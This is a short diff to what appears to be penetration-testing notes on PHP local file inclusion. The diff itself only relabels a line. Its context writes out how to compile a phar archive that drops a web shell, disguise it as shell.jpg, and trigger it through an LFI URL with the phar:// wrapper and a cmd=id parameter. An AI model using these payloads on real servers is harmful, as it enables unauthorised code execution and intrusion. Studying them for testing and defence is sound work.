@@ -257,7 +257,7 @@ if(req.query.language) {
     ## This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with.
     </code></pre>
   * We can compile it into a `phar` file and rename it to `shell.jpg`
-  * **Payload**: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
+  * **Compiler Payload**: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
   * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`**
 
 ## Log Poisoning <a href="#log-poisoning" id="log-poisoning"></a>
